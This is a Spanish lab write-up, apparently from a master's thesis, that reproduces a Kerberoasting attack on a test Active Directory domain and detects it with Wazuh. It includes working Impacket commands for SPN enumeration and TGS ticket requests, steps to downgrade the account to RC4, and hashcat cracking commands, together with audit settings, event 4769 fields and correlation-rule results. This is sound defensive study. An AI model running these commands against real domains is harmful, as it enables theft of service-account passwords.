# Kerberoasting en Active Directory

## MITRE ATT&CK T1558.003

Este escenario reproduce de manera controlada un ataque de Kerberoasting contra una cuenta de servicio de Active Directory.

El objetivo no es únicamente ejecutar el ataque, sino estudiar:

- Cómo funciona Kerberos.
- Por qué una cuenta con un SPN puede ser atacada.
- Qué información obtiene el atacante.
- Qué eventos genera Windows.
- Cómo detectar la actividad con Wazuh.
- Cómo correlacionar varias solicitudes.
- Cómo reducir el riesgo mediante AES, contraseñas fuertes y mínimo privilegio.

> Este escenario debe ejecutarse exclusivamente en un laboratorio propio y autorizado. Las contraseñas reales y los tickets Kerberos completos no se publican en este repositorio.

---

## 1. Arquitectura del laboratorio

| Sistema | Función | IP |
|---|---|---|
| Wazuh Manager | SIEM y análisis de alertas | `192.168.56.10` |
| DC01 | Active Directory, DNS y KDC | `192.168.56.20` |
| WS01 | Estación de trabajo Windows | `192.168.56.30` |
| Kali-ATK01 | Equipo de pruebas de seguridad | `192.168.56.40` |

El dominio utilizado es:

```text
lab.local
```

La cuenta controlada de servicio es:

```text
LAB\svc_sql
```

El SPN utilizado es:

```text
MSSQLSvc/DC01.lab.local:1433
```

La contraseña utilizada durante la prueba no se publica en el repositorio.

---

## 2. Qué es Kerberos

Kerberos es el protocolo de autenticación principal utilizado por Active Directory.

Su objetivo es permitir que un usuario acceda a distintos servicios del dominio sin tener que enviar su contraseña directamente a cada servidor.

Los componentes principales son:

| Componente | Función |
|---|---|
| KDC | Servicio del controlador de dominio que emite tickets. |
| AS | Autentica inicialmente al usuario. |
| TGT | Ticket inicial que demuestra que el usuario se autenticó. |
| TGS | Ticket que permite acceder a un servicio concreto. |
| SPN | Nombre con el que Kerberos identifica un servicio. |
| Cuenta de servicio | Cuenta de Active Directory asociada al SPN. |

El funcionamiento normal puede resumirse así:

1. El usuario se autentica contra el controlador de dominio.
2. El controlador de dominio entrega un TGT.
3. El usuario solicita un TGS para un servicio.
4. El KDC localiza la cuenta asociada al SPN.
5. El KDC entrega el ticket de servicio.
6. El usuario presenta ese ticket al servicio.

Una parte del TGS queda protegida mediante una clave derivada de la contraseña de la cuenta de servicio.

---

## 3. Qué es Kerberoasting

Kerberoasting aprovecha el funcionamiento legítimo de Kerberos.

Un usuario autenticado puede:

1. Consultar Active Directory para buscar cuentas con SPN.
2. Solicitar un TGS para uno de esos servicios.
3. Extraer la parte cifrada del ticket.
4. Probar posibles contraseñas offline.
5. Recuperar la contraseña si es débil o predecible.

El atacante no descifra directamente Kerberos. Lo que hace es probar contraseñas candidatas hasta encontrar una que produzca una clave compatible con el ticket obtenido.

### Por qué es peligroso

- Normalmente no requiere privilegios administrativos.
- El ticket puede solicitarlo cualquier usuario autenticado.
- El cracking se realiza offline.
- No se genera un fallo de inicio de sesión por cada contraseña probada.
- No se bloquea la cuenta por los intentos de Hashcat.
- Las cuentas de servicio suelen tener contraseñas antiguas.
- Algunas cuentas de servicio tienen privilegios excesivos.

---

## 4. Diferencia frente a otros ataques

| Técnica | Material utilizado | Objetivo |
|---|---|---|
| Kerberoasting | Ticket TGS | Recuperar la contraseña de una cuenta con SPN. |
| AS-REP Roasting | Respuesta AS-REP | Atacar cuentas sin preautenticación Kerberos. |
| Pass-the-Hash | Hash NTLM | Autenticarse sin conocer la contraseña. |
| Pass-the-Ticket | Ticket Kerberos | Reutilizar un ticket ya obtenido. |
| Golden Ticket | Clave de `krbtgt` | Crear TGT falsificados. |

Durante este escenario Impacket puede generar conexiones NTLM para consultar LDAP. Eso no significa automáticamente que se haya realizado Pass-the-Hash.

---

## 5. Preparación de DC01

### 5.1. Acceder mediante SSH

Desde PowerShell en el equipo anfitrión:

```powershell
ssh Administrator@192.168.56.20
```

La contraseña debe introducirse interactivamente y no guardarse en el repositorio.

La sesión SSH abre inicialmente `cmd.exe`. Entrar en PowerShell:

```cmd
powershell.exe -NoLogo -NoProfile
```

Comprobar el sistema:

```powershell
hostname
whoami
$PSVersionTable.PSVersion
```

Resultado esperado:

```text
DC01
lab\administrator
PowerShell 5.1
```

---

## 6. Comprobar el módulo de Active Directory

```powershell
Get-Module -ListAvailable -Name ActiveDirectory
```

Si no está instalado:

```powershell
Import-Module ServerManager
Install-WindowsFeature RSAT-AD-PowerShell -IncludeAllSubFeature
```

Cargar el módulo:

```powershell
Import-Module ActiveDirectory
```

Comprobar el dominio:

```powershell
Get-ADDomain |
    Select-Object DNSRoot,NetBIOSName,DomainMode
```

---

## 7. Crear la cuenta de servicio controlada

Solicitar la contraseña de forma interactiva:

```powershell
$LabPassword = Read-Host 'Contraseña temporal de LAB\svc_sql' -AsSecureString
```

Comprobar si la cuenta existe:

```powershell
$Svc = Get-ADUser -Filter "SamAccountName -eq 'svc_sql'"
```

Crear la cuenta solo si no existe:

```powershell
if ($null -eq $Svc) {
    New-ADUser `
        -Name 'svc_sql' `
        -SamAccountName 'svc_sql' `
        -UserPrincipalName 'svc_sql@lab.local' `
        -AccountPassword $LabPassword `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Description 'TFM - Cuenta controlada para Kerberoasting'
}
```

Garantizar que la contraseña y configuración sean las esperadas:

```powershell
Set-ADAccountPassword `
    -Identity svc_sql `
    -Reset `
    -NewPassword $LabPassword

Enable-ADAccount -Identity svc_sql

Set-ADUser `
    -Identity svc_sql `
    -PasswordNeverExpires $true `
    -Description 'TFM - Cuenta controlada para Kerberoasting'
```

Comprobar la cuenta:

```powershell
Get-ADUser svc_sql
```

---

## 8. Comprobar los privilegios

```powershell
Get-ADPrincipalGroupMembership svc_sql |
    Select-Object Name,GroupScope,GroupCategory |
    Format-Table -AutoSize
```

La cuenta no debe pertenecer a:

```text
Domain Admins
Enterprise Admins
Administrators
Schema Admins
```

La pertenencia normal esperada es `Domain Users`.

---

## 9. Registrar el SPN

Definir el SPN:

```powershell
$Spn = 'MSSQLSvc/DC01.lab.local:1433'
```

Comprobar si está duplicado:

```powershell
setspn.exe -Q $Spn
```

Obtener las propiedades actuales:

```powershell
$Svc = Get-ADUser svc_sql -Properties ServicePrincipalName
```

Registrar el SPN si todavía no existe:

```powershell
if ($Svc.ServicePrincipalName -notcontains $Spn) {
    setspn.exe -S $Spn 'LAB\svc_sql'
}
```

Comprobar el resultado:

```powershell
setspn.exe -L 'LAB\svc_sql'
```

Resultado esperado:

```text
MSSQLSvc/DC01.lab.local:1433
```

No es necesario instalar realmente SQL Server. Para que el KDC entregue el TGS es suficiente con que el SPN esté registrado en Active Directory.

---

## 10. Configurar RC4 para la prueba

Configurar temporalmente la cuenta para utilizar RC4:

```powershell
Set-ADUser svc_sql `
    -Replace @{'msDS-SupportedEncryptionTypes'=4}
```

El valor `4` representa RC4-HMAC.

Esta configuración se utiliza únicamente para demostrar el escenario vulnerable.

Comprobar la cuenta:

```powershell
Get-ADUser svc_sql `
    -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes,PasswordNeverExpires,Description |
Format-List `
    SamAccountName,
    Enabled,
    PasswordNeverExpires,
    ServicePrincipalName,
    msDS-SupportedEncryptionTypes,
    Description
```

Resultado esperado:

```text
SamAccountName                : svc_sql
Enabled                       : True
PasswordNeverExpires          : True
ServicePrincipalName          : MSSQLSvc/DC01.lab.local:1433
msDS-SupportedEncryptionTypes : 4
Description                   : TFM - Cuenta controlada para Kerberoasting
```

---

## 11. Activar la auditoría Kerberos

Activar la auditoría de solicitudes TGS:

```powershell
auditpol.exe `
    /set `
    /subcategory:"Kerberos Service Ticket Operations" `
    /success:enable `
    /failure:enable
```

Comprobarla:

```powershell
auditpol.exe `
    /get `
    /subcategory:"Kerberos Service Ticket Operations"
```

Resultado esperado:

```text
Kerberos Service Ticket Operations    Success and Failure
```

Esta política permite generar el evento Windows Security 4769.

---

## 12. Comprobar el agente Wazuh

```powershell
Get-Service WazuhSvc |
    Format-Table Name,Status,StartType
```

Resultado esperado:

```text
WazuhSvc    Running    Automatic
```

Comprobar el registro:

```powershell
Get-Content `
    'C:\Program Files (x86)\ossec-agent\ossec.log' `
    -Tail 60
```

Comprobar la conexión con el manager:

```powershell
Get-NetTCPConnection `
    -RemoteAddress 192.168.56.10 `
    -RemotePort 1514 `
    -ErrorAction SilentlyContinue |
Format-Table State,LocalAddress,LocalPort,RemoteAddress,RemotePort
```

Resultado esperado:

```text
Established
```

---

## 13. Enumerar cuentas con SPN desde Kali

Comprobar que Impacket está instalado:

```bash
command -v impacket-GetUserSPNs
```

Si no aparece:

```bash
sudo apt update
sudo apt install -y python3-impacket impacket-scripts
```

Enumerar cuentas con SPN:

```bash
impacket-GetUserSPNs \
  -dc-ip 192.168.56.20 \
  'lab.local/Administrator'
```

Impacket solicitará la contraseña de la cuenta.

Resultado esperado:

```text
MSSQLSvc/DC01.lab.local:1433    svc_sql
```

Esta fase realiza una consulta LDAP para identificar cuentas asociadas a servicios Kerberos.

---

## 14. Solicitar el ticket TGS

```bash
impacket-GetUserSPNs \
  -dc-ip 192.168.56.20 \
  -request-user svc_sql \
  'lab.local/Administrator' \
  | tee /tmp/salida_kerberoast.txt
```

Extraer únicamente la línea del ticket:

```bash
grep '^\$krb5tgs\$' \
  /tmp/salida_kerberoast.txt \
  > /tmp/kerberoast_svc_sql.txt
```

Comprobar el fichero sin mostrar el ticket completo:

```bash
wc -l /tmp/kerberoast_svc_sql.txt
head -c 40 /tmp/kerberoast_svc_sql.txt
echo
```

El prefijo esperado es:

```text
$krb5tgs$23$
```

Correspondencia:

```text
23 decimal = 0x17 hexadecimal = RC4-HMAC
```

---

## 15. Generar tres solicitudes en 120 segundos

Introducir la contraseña sin escribirla directamente en el comando:

```bash
read -rsp 'Contraseña de LAB\Administrator: ' DOMAIN_PASSWORD
echo
```

Ejecutar tres solicitudes:

```bash
for i in 1 2 3; do
  echo "Solicitud TGS $i de 3"

  impacket-GetUserSPNs \
    -dc-ip 192.168.56.20 \
    -request-user svc_sql \
    "lab.local/Administrator:${DOMAIN_PASSWORD}" \
    >/dev/null

  sleep 2
done

unset DOMAIN_PASSWORD
```

Resultados esperados:

| Solicitud | Regla esperada |
|---:|---:|
| Primera | `100040` |
| Segunda | `100040` |
| Tercera | `100041` |

La regla `100041` correlaciona tres solicitudes desde la misma dirección en un máximo de 120 segundos.

---

## 16. Cracking offline controlado

Comprobar Hashcat:

```bash
hashcat --version
```

Si no está instalado:

```bash
sudo apt install -y hashcat
```

Solicitar la contraseña controlada:

```bash
read -rsp 'Contraseña controlada de svc_sql: ' SERVICE_PASSWORD
echo
```

Crear un diccionario temporal:

```bash
printf '%s\n' \
  'Password123!' \
  "${SERVICE_PASSWORD}" \
  'Summer2026!' \
  > /tmp/diccionario_tfm.txt

unset SERVICE_PASSWORD
```

Ejecutar Hashcat:

```bash
hashcat \
  -m 13100 \
  -a 0 \
  /tmp/kerberoast_svc_sql.txt \
  /tmp/diccionario_tfm.txt \
  --potfile-path /tmp/kerberoast_svc_sql.pot
```

Mostrar el resultado:

```bash
hashcat \
  -m 13100 \
  /tmp/kerberoast_svc_sql.txt \
  --show \
  --potfile-path /tmp/kerberoast_svc_sql.pot
```

El modo `13100` corresponde a:

```text
Kerberos 5 TGS-REP etype 23
RC4-HMAC
```

Hashcat trabaja offline. El controlador de dominio no recibe un intento por cada contraseña probada.

---

## 17. Limpiar los materiales sensibles

Después de obtener las evidencias:

```bash
rm -f \
  /tmp/salida_kerberoast.txt \
  /tmp/kerberoast_svc_sql.txt \
  /tmp/diccionario_tfm.txt \
  /tmp/kerberoast_svc_sql.pot
```

No deben subirse al repositorio:

- Tickets `$krb5tgs$` completos.
- Ficheros `.pot`.
- Diccionarios con contraseñas reales.
- Cachés Kerberos.
- Contraseñas del dominio.
- Exportaciones sin anonimizar.

---

## 18. Evento esperado

El controlador de dominio debe generar el evento:

```text
Windows Security 4769
```

Campos esperados:

| Campo | Valor |
|---|---|
| Service Name | `svc_sql` |
| Client Address | `::ffff:192.168.56.40` |
| Ticket Encryption Type | `0x17` |
| Ticket Options | `0x40810010` |
| Status | `0x0` |

La representación:

```text
::ffff:192.168.56.40
```

corresponde a una dirección IPv4 representada dentro de IPv6.

---

## 19. Resultado obtenido

La prueba validada produjo:

| Record ID | Regla Wazuh | Resultado |
|---:|---:|---|
| `137452` | `100040` | Primera solicitud RC4 desde Kali. |
| `137467` | `100040` | Segunda solicitud RC4 desde Kali. |
| `137502` | `100041` | Correlación de tres solicitudes. |

La tercera alerta incluyó los dos eventos anteriores en `previous_output`, confirmando la correlación temporal.

---

## 20. Limitaciones

- Una única solicitud TGS puede ser legítima.
- Un atacante puede solicitar solamente un ticket.
- El atacante puede espaciar las solicitudes.
- La regla RC4 no detecta tickets AES.
- Hashcat funciona offline y no genera eventos en DC01.
- Un origen autorizado podría estar comprometido.
- Un inicio de sesión NTLM no demuestra automáticamente Pass-the-Hash.

La detección debe combinar:

```text
Evento + cifrado + origen + cuenta + servicio + volumen + contexto
```

---

## 21. Archivos relacionados

- [Detección de Kerberoasting](../detections/kerberoasting.md)
- [Evidencias](../evidence/kerberoasting/README.md)
- [Mitigación y migración a AES](../docs/kerberoasting-remediation.md)

---

## 22. Referencias

- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [Microsoft — Evento de seguridad 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Wazuh — Detección de ataques contra Active Directory](https://wazuh.com/blog/how-to-detect-active-directory-attacks-with-wazuh-part-1-of-2/)
- [Fortra Impacket — GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Hashcat — Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
